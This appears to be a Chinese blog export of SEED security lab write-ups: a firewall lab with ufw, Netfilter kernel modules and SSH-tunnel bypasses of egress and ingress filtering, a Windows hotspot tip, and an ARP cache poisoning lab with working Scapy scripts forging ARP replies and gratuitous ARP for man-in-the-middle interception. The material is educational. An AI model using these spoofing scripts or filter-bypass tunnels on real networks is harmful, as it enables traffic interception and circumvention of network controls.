允许\拒绝\拒绝并提示\限制 [数据 进入\发出][记录\全记录] 端口[/协议]&gt; ufw [--dry-run] [delete] [insert NUM] allow|deny|reject|limit [in|out][log|log-all] PORT[/PROTOCOL]&gt; 输入命令sudo ufw deny out 23 1234567891011&gt; [11/12/19]seed@VM:~$ sudo ufw deny out 23&gt; Rule added&gt; Rule added (v6)&gt; [11/12/19]seed@VM:~$ sudo ufw status&gt; Status: active&gt; &gt; To Action From&gt; -- ------ ----&gt; 23 DENY OUT Anywhere &gt; 23 (v6) DENY OUT Anywhere (v6) &gt; 测试效果 从上图可以看到，主机AtelnetB是没有任何数据包产生的。而当主机Btelnet主机A则没有问题 Prevent B from doing telnet to Machine A. 阻止来自B向A的telnet访问。 基于上步，再次输入命令sudo ufw deny in 23 测试效果 从上图可以看到，此时主机B的syn数据包发送到了主机A，但是主机A没有任何相应了 Prevent A from visiting an external（外部的） web site. You can choose any web site that you like to block, but keep in mind, some web servers have multiple IP addresses. 阻止A访问外部的站点。你可以选择任何一个你想要禁止的网站，但是记住，一些网站有多个IP地址。命令和上述内容类似，就不再做重复实验了，主要就是限制IP地址 sudo ufw deny from 123.45.67.89 上述3个实验完成后，我暂时先关闭了ufw功能 sudo ufw disable You can find the manual of ufw by typing “man ufw” or search it online. It is pretty straightforward to use. Please remember that the firewall is not enabled by default, so you should run a command to specifically（明确的） enable it. We list some commonly used commands in Appendix A. 你可以通过输入“man ufw”来获取ufw的手册，或是在网络上搜索它。这是最直白的使用方式。需要注意的是，防火墙默认是没有开启的，所以你需要通过使用命令来明确开启它。我们在附录A中列出了一些经常被使用的命令。 Before starting the task, go to the default policy file /etc/default/ufw. find the following entry, and change the rule from DROP to ACCEPT; otherwise, all the incoming traffic will be dropped by default. 在开始任务之前，找到默认的策略文件夹/etc/default/ufw。找到以下条目，然后把规则从DROP改为ACCEPT；不然，默认情况下的所有流入数据将会被丢弃。（注意使用sudo来修改。） 123# Set the default input policy to ACCEPT, DROP, or REJECT. Please note that if # you change this you will most likely want to adjust your rules.DEFAULT_INPUT_POLICY="DROP" 2.2 Task 2:Implementing a Simple Firewall任务2：实现一个简单防火墙 The firewall you used in the previous task is a packet filtering type of firewall. The main part of this type of firewall is the filtering part, which inspects each incoming and outgoing packets, and enforces（强制执行） the firewall policies set by the administrator. Since the packet processing is done within the kernel, the filtering must also be done within the kernel. Therefore, it seems that implementing such a firewall requires us to modify the Linux kernel. In the past, this had to be done by modifying and rebuilding the kernel. The modern Linux operating systems provide several new mechanisms（机制） to facilitate（促进） the manipulation of packets without rebuilding the kernel image. These two mechanisms are Loadable Kernel Module (LKM) and Netfilter. 你在上一个任务中用到的防火墙是包过滤型防火墙。该类型防火墙的主要部分是过滤部分，它检测每一个流入与流出的数据包，并且强制执行防火墙上管理员所做的策略。由于包处理是在内核中完成，所以过滤也需要在内核中完成。因此，看上去似乎实现这类防火墙就要求我们去修改Linux的内核。在过去，修改和重建内核是必须要做的事情。现代Linux操作系统提供多种新的机制来促进数据包的操作，而无需重建内核镜像。以下有2种机制：Loadable Kernel Module (LKM) 和 Netfilter。 LKM allows us to add a new module to the kernel at the runtime. This new module enables us to extend the functionalities of the kernel, without rebuilding the kernel or even rebooting the computer. The packet filtering part of a firewall can be implemented as an LKM. However, this is not enough. In order for the filtering module to block incoming/outgoing packets, the module must be inserted into the packet processing path. This cannot be easily done in the past before the Netfilter was introduced into the Linux. LKM允许我们在运行期间给内核添加一个新的模块。这种新的模块使我们能扩展内核功能，而无需重建核心甚至是重启电脑。作为LKM中防火墙的包过滤部分是可以被实现的。然而，这还不够。为了使过滤模块能够阻止传入/传出的数据包，必须将模块插入到数据包处理路径中。在以前还没有在Linux中引入Netfilter时，这可不容易实现。 Netfilter is designed to facilitate the manipulation of packets by authorized（合法） users. Netfilter achieves this goal by implementing a number of hooks in the Linux kernel. These hooks are inserted into various places, including the packet incoming and outgoing paths. If we want to manipulate the incoming packets, we simply need to connect our own programs (within LKM) to the corresponding（相应的） hooks. Once an incoming packet arrives, our program will be invoked. Our program can decide whether this packet should be blocked or not; moreover, we can also modify the packets in the program. Netfilter旨在促进授权用户对数据包的操作。Netfilter通过在Linux内核中实现许多hooks来实现此目标。这些钩子被插入到多个地点，包括数据包流入与流出的路径。如果我们想操作流入的数据包，我们只需要连接我们的程序（在LKM内）到相应的钩子上即可。当一个流入数据包到达，我们的程序将被唤醒。我们的程序可以决定这个数据包是否该被阻止或是放行；此外，我们还可以在程序中修改数据包。 In this task, you need to use LKM and Netfilter to implement the packet filtering module. This module will fetch（获取） the firewall policies from a data structure, and use the policies to decide whether packets should be blocked or not. To make your life easier, so you can focus on the filtering part, the core of firewalls, we allow you to hardcode your firewall policies in the program. You should support at least five different rules, including the ones specified in the previous task. Guidelines on how to use Netfilter can be found in Section 3. In addition, Chapter 14 (§14.4) of the SEED book provides more detailed explanation on Netfilter. 在该任务中，你需要使用LKM和Netfilter来实现包过滤模块。该模块将从数据结构中获取防火墙策略，并且使用策略来决定数据包是否该被阻止。为了让你生活更轻松，你可以只关注过滤部分，这是防火墙的核心，我们允许你在程序中硬编码你的防火墙策略。你应该支持至少5个不同的规则，包括上一个任务指定的规则。有关如何使用Netfilter的指南，请参见第3节。此外，SEED手册的第14章（第14.4节）提供了有关Netfilter的更详细说明。 Note for Ubuntu 16.04 VM: The code in the SEED book was developed in Ubuntu 12.04. It needs to be changed slightly to work in Ubuntu 16.04. The change is in the definition of the callback function telnetFilter(), because the prototype of Netfilter’s callback function has been changed in Ubuntu 16.04. See the difference in the following: 对于Ubuntu 16.04 VM的注意事项：SEED书中的代码是在Ubuntu 12.04中开发的。 需要稍作更改才能在Ubuntu 16.04中工作。 更改是在回调函数telnetFilter（）的定义中进行的，因为Netfilter的回调函数的原型已在Ubuntu 16.04中进行了更改。 请参阅以下内容： 12345678// In Ubuntu 12.04unsigned int telnetFilter(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))// In Ubuntu 16.04unsigned int telnetFilter(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) 2.3 Task 3: Evading（逃避） Egress Filtering任务3：绕过出口过滤 Many companies and schools enforce（执行，实施） egress filtering, which blocks users inside of their networks from reaching out to certain web sites or Internet services. They do allow users to access other web sites. In many cases, this type of firewalls inspect the destination IP address and port number in the outgoing packets. If a packet matches the restrictions（限制）, it will be dropped. They usually do not conduct deep packet inspections (i.e., looking into the data part of packets) due to the performance reason. In this task, we show how such egress filtering can be bypassed using the tunnel mechanism. There are many ways to establish tunnels; in this task, we only focus on SSH tunnels. 许多公司和学校实施了出口过滤，它阻止了网络内部的用户访问特定的网站或是互联网服务。但是他们允许用户访问其他网站。在很多案例中，该类防火墙检测外出数据包中的目的IP地址和端口号。如果一个包匹配上了该限制，那它将会被丢弃。由于性能方面的原因，他们通常不做深度包检测（例如，查看数据包中的数据部分）。在这组任务中，我们说明如何使用隧道机制来绕过此类出口过滤。有许多方式可以建立隧道；在该任务下，我们只关注SSH隧道。 You need two VMs A and B for this task (three will be better). Machine A is running behind a firewall (i.e., inside the company or school’s network), and Machine B is outside of the firewall. Typically, there is a dedicated machine that runs the firewall, but in this task, for the sake of convenience, you can run the firewall on Machine A. You can use the firewall program that you implemented in the previous task, or directly use ufw. You need to set up the following two firewall rules: 在该任务中，你需要2个虚拟机A和B（如果有3个更好）。机器A运行在防火墙后（例如在公司或是学校网络内部），机器B在防火墙的外部。一般来说，要有一台运行防火墙的检测主机，但是在该任务中，为方便起见，你可以在主机A上运行防火墙。你可以使用在上一个实验中所实现的防火墙程序，或是直接使用ufw。你需要设置以下防火墙规则： Block all the outgoing traffic to external telnet servers. In reality, the servers that are blocked are usually game servers or other types of servers that may affect the productivity（生产率） of employees. In this task, we use the telnet server for demonstration（示范） purposes. You can run the telnet server on Machine B. If you have a third VM, Machine C, you can run the telnet server on Machine C. 阻止所有到外部telnet服务器的外出流量。实际上，这些被阻止的服务经常是一些游戏服务或是其他的可能影响到员工生产效率的服务。在该任务中，我们使用telnet服务器来完成示范。你可以在B上运行telnet服务。如果你有3台虚拟机，你可以在第三台机器C上运行telnet服务。 Block all the outgoing traffic to www.facebook.com, so employees (or school kids) are not distracted（发愣，发疯） during their work/school hours. Social network sites are commonly blocked by companies and schools. After you set up the firewall, launch your Firefox browser, and try to connect to Facebook, and report what happens. If you have already visited Facebook before using this browser, you need to clear all the caches using Firefox’s menu: Edit -&gt; Preferences -&gt; Privacy &amp; Security (left pane) -&gt; Clear History (Button on right); otherwise, the cached pages may be displayed. If everything is set up properly, you should not be able to see Facebook pages. It should be noted that Facebook has many IP addresses, it can change over the time. Remember to check whether the address is still the same by using ping or dig command. If the address has changed, you need to update your firewall rules. You can also choose web sites with static IP addresses, instead of using Facebook. For example, most universities’ web servers use static IP addresses (e.g. www.syr.edu); for demonstration purposes, you can try block these IPs, instead of Facebook. 阻止所有去往 www.facebook.com 的外出流量（这里我们设置成 www.baidu.com ），以使员工（或是学生）在他们的工作时间内不会分心。社交网站通常会被公司或学校阻止访问。在你设置完防火墙后，启动你的火狐浏览器，并且尝试连接到Facebook（我们这里是百度），然后报告发生了什么。如果你之前使用过浏览器访问过Facebook（百度），你需要清空所有缓存，使用火狐的菜单Edit -&gt; Preferences -&gt; Privacy &amp; Security (left pane) -&gt; Clear History (Button on right)；否则，可能会显示缓存的页面。如果所有事情都设置好了，你将无法看到Facebook（百度）页面。需要注意的是脸书（百度）有多个IP，它可以随时间而改变。请记住使用ping或dig命令检查地址是否仍然相同。如果地址发生了改变，你需要更新你的防火墙规则。你也可以选择使用静态IP的网站，而不是使用脸书。例如大部分的学校网站使用的是静态IP（例如 www.syr.edu ）；出于示范目的，你可以尝试阻止这些IP地址，而不是脸书。 In addition to set up the firewall rules, you also need the following commands to manage the firewall: 除了设置防火墙规则，您还需要以下命令来管理防火墙： 1234$ sudo ufw enable // this will enable the firewall.$ sudo ufw disable // this will disable the firewall.$ sudo ufw status numbered // this will display the firewall rules.$ sudo ufw delete 3 // this will delete the 3rd rule. Task 3.a: Telnet toMachine B through the firewall任务3.a：通过防火墙telnet到机器B To bypass the firewall, we can establish an SSH tunnel between Machine A and B, so all the telnet traffic will go through this tunnel (encrypted), evading the inspection. Figure 1 illustrates（说明） how the tunnel works. The following command establishes an SSH tunnel between the localhost (port 8000) and machine B (using the default port 22); when packets come out of B’s end, it will be forwarded to Machine C’s port 23 (telnet port). If you only have two VMs, you can use one VM for both Machine B and Machine C. 要绕过防火墙，我们可以在A和B之间建立一个SSH隧道，那么所有的telnet流量将通过该隧道（被加密），以逃避检测。图1说明了该隧道是如何工作的。以下命令在本机（8000端口）和主机B（默认使用22端口）之间建立了一个SSH隧道；当数据包从B端流出时，它将被转发给主机C的23号端口（即telnet端口）。如果你仅有2台VM，你可以使用一台虚拟机用于B和C。 1234$ ssh -L 8000:Machine_C_IP:23 seed@Machine_B_IP// We can now telnet to Machine C via the tunnel:$ telnet localhost 8000 When we telnet to localhost’s port 8000, SSH will transfer all our TCP packets from one end of the tunnel on localhost:8000 to the other end of the tunnel on Machine B; from there, the packets will be forwarded to Machine C:23. Replies from Machine C will take a reverse（相反的） path, and eventually reach our telnet client. Essentially, we are able to telnet to Machine C. Please describe your observation and explain how you are able to bypass the egress filtering. You should use Wireshark to see what exactly is happening on the wire. 当我们telnet到本机的8000端口，SSH将转换我们所有的TCP报文，从本机8000端口的隧道一端发送到主机B的隧道另一端；从那里，数据包将会被转发到主机C的23号端口。来自C的回应报文将采用相反的方式，并最终到达我们的telnet客户端。本质上，我们可以telnet到主机C。请描述你的发现并解释你是如何绕过出口过滤的。你应该使用wireshark来观测在链路上到底发生了什么。 Task 3.b: Connect to Facebook using SSH Tunnel.任务 3.b：使用SSH隧道连接到Facebook To achieve this goal, we can use the approach（途径） similar to that in Task 3.a, i.e., establishing a tunnel between your localhost:port and Machine B, and ask B to forward packets to Facebook. To do that, you can use the following command to set up the tunnel: “ssh -L 8000:FacebookIP:80 …”. We will not use this approach, and instead, we use a more generic（通用的） approach, called dynamic port forwarding, instead of a static one like that in Task 3.a. To do that, we only specify the local port number, not the final destination. When Machine B receives a packet from the tunnel, it will dynamically decide where it should forward the packet to based on the destination information of the packet. 为了实现该目标，我们可以使用在任务3.a中类似的方法，例如，在你的本机和主机B之间建立一个隧道，并且要求B转发数据包到Facebook。为了实现上述内容，你可以使用以下命令来设置隧道ssh -L 8000:FacebookIP:80 ...。但是我们将不会使用该方式，相反，我们会使用更通用的方式，叫做动态端口转发，而不是像任务3.a中的静态方式。为此，我们仅需指定本地端口号，而非目的地的。当主机B收到从隧道发来的数据包，它将根据数据包的目的地址信息，动态决定数据包应该转发至何处。 $ ssh -D 9000 -C seed@machine_B Similar to the telnet program, which connects localhost:9000, we need to ask Firefox to connect to localhost:9000 every time it needs to connect to a web server, so the traffic can go through our SSH tunnel. To achieve that, we can tell Firefox to use localhost:9000 as its proxy. To support dynamic port forwarding, we need a special type of proxy called SOCKS proxy, which is supported by most browsers. To set up the proxy in Firefox, go to the menu bar, click Edit -&gt; Preferences, scroll（滚动） down to Network Proxy, and click the Settings button. Then follow Figure 2. After the setup is done, please do the following: 与telnet程序类似，它连接到了本地主机的9000端口，我们要让火狐在每次需要连接到网页服务器的时候，让它来连接到本地主机的9000端口，这样才可以让流量通过我们的SSH隧道。为了实现上述要求，我们可以让火狐使用本地的9000端口作为代理。为了支持动态端口转发，我们需要一个特殊类型的代理，它叫SOCKS proxy，在大部分浏览器中它都是被支持使用的。为了在火狐浏览器中设置代理，请到菜单栏，点击Edit -&gt; Preferences，向下滚动到Network Proxy，并且点击Settings按钮。然后照图2操作。在设置完成后，请做以下步骤： Run Firefox and go visit the Facebook page. Can you see the Facebook page? Please describe your observation. 运行火狐然后浏览Facebook页面。你能否看到该网页呢？请描述你的发现。 After you get the facebook page, break the SSH tunnel, clear the Firefox cache, and try the connection again. Please describe your observation. 在你打开了facebook网页后，终止SSH隧道，清空火狐上的缓存，并再次尝试访问网页。请描述你的发现。 Establish the SSH tunnel again and connect to Facebook. Describe your observation. 再次建立SSH隧道，并且连接到Facebook。描述你的发现。 Please explain what you have observed, especially on why the SSH tunnel can help bypass the egress filtering. You should use Wireshark to see what exactly is happening on the wire. Please describe your observations and explain them using the packets that you have captured. 请解释你发现了什么，特别是为什么SSH隧道可以帮助你绕过出口过滤。你应该使用wireshark来观测在链路上到底发生了什么。请描述你的发现并使用你捕获的数据包来解释它们。 2.4 Task 4: Evading Ingress Filtering2.4 任务4：逃避入口过滤 Machine A runs a web server behind a firewall; so only the machines in the internal network can access thisweb server. You are working from home and needs to access this internal web server. You do not have VPN, but you have SSH, which is considered as a poor man’s VPN. You do have an account on Machine A (or another internal machine behind the firewall), but the firewall also blocks incoming SSH connection, so youcannot SSH into any machine on the internal network. Otherwise, you can use the same technique from Task 3 to access the web server. The firewall, however, does not block outgoing SSH connection, i.e., if you want to connect to an outside SSH server, you can still do that. 主机A在防火墙后运行了网页服务；所以只有在内部网络的主机可以连接到这台网页服务。你正在家里工作并且需要连接到这台内部的网页服务。你不需要有VPN，但是你有SSH，它可以被认为是穷人的VPN。你需要在主机A（或是其他处于防火墙后的网络主机）上有个账号，但是防火墙依旧阻止流入的SSH连接，所以你无法SSH到在内部网络上的任意一台主机。此外，你可以使用在任务3中的相同技术连接到网页服务器。然而，防火墙不会阻止外出的SSH连接，例如，如果你想连接到外部的SSH服务器，你依旧可以实现它。 The objective of this task is to be able to access the web server on Machine A from outside. We will use two machines to emulate（仿真） the setup. Machine A is the internal computer, running the protected web server; Machine B is the outside machine at home. On Machine A, we block Machine B from accessing its port 80 (web server) and 22 (SSH server). You need to set up a reverse SSH tunnel on Machine A, so once you get home, you can still access the protected web server on A from home. 这组任务的目标是能够从外部连接到主机A的网页服务。我们将使用2个主机来模拟设置。主机A是内部电脑，它运行了受保护的网页服务；主机B是在家的外部主机。在主机A，我们阻止来自主机B对于80端口（网页服务）和22端口（SSH服务）的连接。你需要在主机A上设置一个反向的SSH隧道，一旦你到家，你依旧可以在家访问到在A上的被保护的网页服务。 3. Guidelines（准则）3.1 Loadable Kernel Module3.1可加载的内核模块 The following is a simple loadable kernel module. It prints out “Hello World!” when the module is loaded; when the module is removed from the kernel, it prints out “Bye-bye World!”. The messages are not printed out on the screen; they are actually printed into the /var/log/syslog file. You can use dmesg| tail -10 to read the last 10 lines of message. 以下是一个简单的可加载内核模块。加载模块时，它打印出“ Hello World！”；当从内核中删除该模块时，它会打印出“ Bye-bye World！”。 消息未在屏幕上打印出来；但是它们实际上已打印到 /var/log/syslog文件中。 您可以使用dmesg| tail -10读取消息的最后10行。 12345678910111213#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;int init_module(void)&#123; printk(KERN_INFO "Hello World!\n"); return 0;&#125;void cleanup_module(void)&#123; printk(KERN_INFO "Bye-bye World!.\n");&#125; We now need to create Makefile, which includes the following contents (the above program is named hello.c). Then just type make, and the above program will be compiled into a loadable kernel module. 现在，我们需要创建Makefile，其中包括以下内容（上面的程序名为hello.c）。 然后只需输入make，上面的程序将被编译成可加载的内核模块。 1234567obj-m += hello.oall:make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean Once the module is built by typing make, you can use the following commands to load the module, list all modules, and remove the module: 一旦通过输入make构建模块后，你可以使用以下命令加载模块，列出所有模块以及删除该模块： 123$ sudo insmod mymod.ko (inserting a module) $ lsmod (list all modules) $ sudo rmmod mymod.ko (remove the module) Also, you can use modinfo mymod.ko to show information about a Linux Kernel module. 当然，你可以使用modinfo mymod.ko来展示关于Linux内核模块的信息。 3.2 A Simple Program that Uses Netfilter3.2 使用Netfilter的简单程序 Using Netfilter is quite straightforward. All we need to do is to hook our functions (in the kernel module) to the corresponding Netfilter hooks. Here we show an example: 使用Netfilter非常简单。 我们要做的就是将我们的函数（在内核模块中）挂接到相应的Netfilter挂钩。 这里我们展示一个例子： 123456789101112131415161718192021222324252627282930313233343536#include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/netfilter.h&gt; #include &lt;linux/netfilter_ipv4.h&gt;/* This is the structure we shall use to register our function */ static struct nf_hook_ops nfho;/* This is the hook function itself */unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)&#123; /* This is where you can inspect the packet contained in the structure pointed by skb, and decide whether to accept or drop it. You can even modify the packet */ // In this example, we simply drop all packets return NF_DROP; /* Drop ALL packets */&#125;/* Initialization routine */ int init_module()&#123; /* Fill in our hook structure */ nfho.hook = hook_func; /* Handler function */ nfho.hooknum = NF_INET_PRE_ROUTING; /* First hook for IPv4 */ nfho.pf = PF_INET; nfho.priority = NF_IP_PRI_FIRST; /* Make our function first */ nf_register_hook(&amp;nfho); return 0;&#125;/* Cleanup routine */ void cleanup_module()&#123; nf_unregister_hook(&amp;nfho);&#125; 4. Submission and Demonstration4.提交与示范 Students need to submit a detailed lab report to describe what they have done, what they have observed, and explanation. Reports should include the evidences to support the observations. Evidences include packet traces, screendumps, etc. Students also need to answer all the questions in the lab description. For the programming tasks, students should list the important code snippets followed by explanation. Simply attaching code without any explanation is not enough. 学生需要提交一份详细的实验报告来描述他们所做的事情，所观察到的事情以及解释。 报告应包括支持观察的证据。 证据包括数据包跟踪，截屏等。学生还需要回答实验描述中的所有问题。对于编程任务，学生应列出重要的代码段，然后进行解释。 仅仅附加代码而没有任何解释是不够的。]]></content>
      <categories>
        <category>SEED Labs</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[电脑开启系统无线功能]]></title>
    <url>%2F2019%2F10%2F23%2F%E7%94%B5%E8%84%91%E5%BC%80%E5%90%AF%E7%B3%BB%E7%BB%9F%E6%97%A0%E7%BA%BF%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[1.注意事项 WIN10系统可以快捷开启无线功能 要确保网卡支持无线功能 2.开启步骤 在cmd中输入netsh wlan show drivers，通过支持的承载网络，来确认网络是否能承载 如果显示的“是”，则输入以下两条命令 12netsh wlan set hostednetwork mode=all ssid=接入的名称 key=接入的密码netsh wlan start hostednetwork 让有线网卡帮助设置的无线网卡上网，设置好后，会显示ssid名称，即图中的hikatie。如果没有设置，则会显示正在识别 设置开机自启，在C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp目录下，保存wireless.bat文件 以上步骤设置好后，就可以用手机接入电脑自带的无线了 3.排错 如果显示为否，说明无线网卡驱动有问题。需要修改适配器 此电脑上右键，打开管理，打开设备管理器，找到网络适配器， 在无线网卡上右键，选择更新驱动程序软件，弹出的对话框中选择浏览计算机以查找驱动程序软件 弹出的对话框中选择下面的从计算机的设备驱动程序列表中选取 这里有兼容硬件里面有三个驱动可以选， 图中选择的是第三个。我们可以试试安装其他的驱动，一般换个驱动，问题就可以解决了 注意：netsh wlan stop hostednetwork是关闭无线网络，关闭之后，需要重新启动才能开启网络。]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ARP缓存中毒攻击实验]]></title>
    <url>%2F2019%2F10%2F07%2FARP%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[参考文档：官方原文档 我们可以拿Scapy做什么 Linux TCP/IP 协议栈调优 Python黑客编程3网络数据监听和过滤 1. Overview1.概要 The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure. The ARP cache poisoning attack is a common attack against the ARP protocol. Under such an attack, attackers can fool the victim into accepting forged IP-to-MAC mappings. This can cause the victim’s packets to be redirected to the computer with the forged MAC address. 地址解析协议（ARP）是一个用来发现数据链路层地址的通信协议，例如给出IP地址来获取MAC地址。ARP协议是一个非常简单的协议，并且它并没有实现任何安全措施。ARP缓存中毒攻击是一个依赖于ARP协议的常见攻击。在这种攻击下，攻击者可以欺骗受害者以接受伪造的IP到MAC映射。这可能导致受害者的数据包使用伪造的MAC地址重定向到计算机。 The objective of this lab is for students to gain the first-hand experience on the ARP cache poisoning attack, and learn what damages can be caused by such an attack. In particular, students will use the ARP attack to launch a man-in-the-middle attack, where the attacker can intercept and modify the packets between the two victims A and B. 这个实验的目的是为学生在ARP缓存中毒攻击上获得第一手的经验，并且学到通过这种攻击会导致什么样的危险。更重要的是，学生将使用ARP攻击来发起中间人攻击，攻击者可以在其中拦截和修改两个受害者A和B之间的数据包。 Lab environment. This lab has been tested on our pre-built Ubuntu 16.04 VM, which can be downloaded from the SEED website. 实验环境。该实验已经在预建的Ubuntu 16.04 VM上通过测试，该VM可以在SEED网页上下载。 拓扑图如下：在该图中，我们的主机1和3分别为该文档中的主机A和B，主机2则为该文档中的主机M 2. Task 1: ARP Cache Poisoning2.任务1：ARP缓存中毒 The objective of this task is to use packet spoofing to launch an ARP cache poisoning attack on a target, such that when two victim machines A and B try to communicate with each other, their packets will be intercepted by the attacker, who can make changes to the packets, and can thus become the man in the middle between A and B. This is called Man-In-The-Middle (MITM) attack. In this lab, we use ARP cahce poisoning to conduct an MITM attack. 这个实验的目标是，使用数据包欺骗来发起ARP缓存中毒攻击，以便当两个受害设备A与B试图互相通信时，它们的数据包将被攻击者截获，攻击者可以修改数据包，并且可以成为在A和B之间的中间人。这就是所谓的中间人(MITM)攻击。在该实验中，我们使用ARP缓存中毒来进行中间人攻击。 The following code skeleton（骨架，框架） shows how to construct an ARP packet using Scapy. 以下代码框架展示了如何使用Scapy构建ARP数据包。 12345678#!/usr/bin/python3from scapy.all import *E = Ether()A = ARP()pkt = E/Asendp(pkt) The above program constructs and sends an ARP packet. Please set necessary attribute（属性） names/values to define your own ARP packet. We can use ls(ARP) to see the attribute names of the ARP class. If a field is not set, a default value will be used (see the third column（纵行，列） of the output): 以上程序构建并发送了一个ARP包。请设置必要的属性名称/值来定义你自己的ARP数据包。我们可以使用ls(ARP)来查看ARP类中的属性名称。如果字段没有设置，则将使用默认的值（参考输出的第三列）： 123456789101112$ python3&gt;&gt;&gt; from scapy.all import *&gt;&gt;&gt; ls(ARP)hwtype : XShortField = (1)ptype : XShortEnumField = (2048)hwlen : ByteField = (6)plen : ByteField = (4)op : ShortEnumField = (1)hwsrc : ARPSourceMACField = (None)psrc : SourceIPField = (None)hwdst : MACField = ('00:00:00:00:00:00')pdst : IPField = ('0.0.0.0') 注：在实验环境中，输入python，再输入上述内容是没有问题的。但是，如果输入python3，则会报错ImportError: No module named &#39;scapy&#39;，对于该问题的解决方案如下，注意下面方法是用于python2的，而不是python3。 ImportError: No module.. found error happens when Python doesn’t find your module. So, where does it look for modules? 123&gt; import os&gt; print os.sys.path&gt; Verify /usr/local/lib/python2.7/site-packages is in that list. If not, append it os.sys.path.append(&#39;/usr/local/lib/python2.7/site-packages&#39;) and try to load it. If that still doesn’t work, try re-installing the module, because it seems there is an issue there. In this task, we have three VMs, A, B, and M. We would like to attack A’s ARP cache, such that the following results is achieved in A’s ARP cache. 在该实验中，我们将需要3台VM，即A,B和M。我们想要攻击A的ARP缓存，以便在A的ARP缓存中实现以下结果。 B’s IP address --&gt; M’s MAC address There are many ways to conduct（举办，进行） ARP cache poisoning attack. Students need to try the following three methods, and report whether each method works or not. 进行ARP缓存中毒攻击的方法有很多。学生需要尝试以下三种方式，并且记录每种方式是否可行。（注：我先做的任务B，后再做的任务A，C。） Task 1A (using ARP request). On host M, construct an ARP request packet and send to host A. Check whether M’s MAC address is mapped to B’s IP address in A’s ARP cache. 任务1A（使用ARP请求）在主机M，构建一个ARP请求包并发送给主机A。检测是否在A的ARP缓存表中有B的IP地址映射了M的MAC地址。 在zhangshuaiyang2/ARP-Cache-Poisoning文件夹下，创建了文件task1B.py 文件task1B.py 中的python代码如下 123456789101112&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; &gt; #spoof A,so we need A'mac&gt; E = Ether(dst="08:00:27:04:d9:58")&gt; #src is B,dst is A,but now i'm in M&gt; #op中的1表示who-has，2表示is-at&gt; A = ARP(op = 1,psrc="10.0.2.5",pdst="10.0.2.15")&gt; &gt; pkt = E/A&gt; sendp(pkt)&gt; 在主机A中查看ARP缓存表，第一条命令是没有执行文件显现出来的情况。第二条命令是执行命令后显示出来的情况，可以看到，在A的arp表中已经存在了主机B的ip对应于主机M的mac地址 在执行文件前，我们就使用wireshark开启了抓包。在wireshark中也可以看到结果。A收到了主机M发出的arp广播请求，并且还给主机M一个回应 Task 1B (using ARP reply). On host M, construct an ARP reply packet and send to host A. Check whether M’s MAC address is mapped to B’s IP address in A’s ARP cache. 任务1B（使用ARP回应）在主机M，构建一个ARP回应包并发送到主机A。检测是否在A的ARP缓存表中有B的IP地址映射了M的MAC地址。 我在主机M（即linux2）上，创建了zhangshuaiyang2文件夹，然后再在该文件夹下创建了ARP-Cache-Poisoning文件夹。在ARP-Cache-Poisoning文件夹下，创建了文件task1A.py 文件task1A.py 中的python代码如下 1234567891011&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; &gt; #spoof A,so we need A'mac&gt; E = Ether(dst="08:00:27:04:d9:58")&gt; #src is B,dst is A,but now i'm in M&gt; A = ARP(op = "is-at",psrc="10.0.2.5",pdst="10.0.2.15")&gt; &gt; pkt = E/A&gt; sendp(pkt)&gt; 接下来，我在主机A（即linux1）上，清除了arp缓存表sudo ip neigh flush dev enp0s3 清除完后，再在主机M上，执行task1A.py文件。sudo ./task1A.py 再次查看主机A的arp缓存表，可以发现，主机B的mac地址已经变成主机C的mac了 同时，在主机A上，你也可以用wireshark看到主机M发出的ARP回应报文 然后我们再在A上pingB的IP，理论来说应该是ping不通的。因为A的数据包交给了M 但是从上图可知，开始虽然不通，但最终还是能ping通的。从wireshark截图中，我们就可以发现原因。虽然最开始3个ping包没有回应，但是主机A发现ping不通的时候，又重新发起了ARP请求，请求主机B的mac，并且收到了B的回应，这将导致A的ARP缓存表的更新。所以ping请求包后续封装的目的MAC地址又是正确的了，所以就能ping通。 Task 1C (using ARP gratuitous（免费） message). On host M, construct an ARP gratuitous packets. ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to update outdated（过时） information on all the other machine’s ARP cache. The gratuitous ARP packet has the following characteristics（特性）: The source and destination IP addresses are the same, and they are the IP address of the host issuing the gratuitous ARP. The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC address (ff:ff:ff:ff:ff:ff). No reply is expected. 任务1C（使用无故ARP）在主机M，构建一个无故ARP报文。无故ARP是一个特殊的ARP请求包。它被使用在，当一个主机设备需要在其他所有的设备的ARP缓存表中更新过时信息时。无故ARP报文拥有以下特点： 源IP地址和目标IP地址相同，它们是发出免费ARP的主机的IP地址。 在ARP头部和以太网头部中的目的MAC地址都是广播地址（ff:ff:ff:ff:ff:ff） 理论来说不会收到回应（注：如果假冒的主机是存在的，那么还是会有回应） 测试前可以清除主机A和B的arp缓存表，sudo ip neigh flush dev enp0s3，不清除也没事。正好我们可以看下在主机A中，是不是arp中的B与网关的mac地址都成为主机M的了 在主机M上编写程序文件。文件task1C.py 中的python代码如下。由于是欺骗所有人，所以我就没有设置假冒B了，因为也要欺骗B。这里我假冒的是网关IP 1234567891011&gt; #!/usr/bin/python&gt; from scapy.all import *&gt; &gt; #spoof all,so we need broad'mac&gt; E = Ether(dst="ff:ff:ff:ff:ff:ff")&gt; #src is gateway,dst is gateway,but now i'm in M&gt; A = ARP(op = 1,psrc="10.0.2.1",pdst="10.0.2.1")&gt; &gt; pkt = E/A&gt; sendp(pkt)&gt; 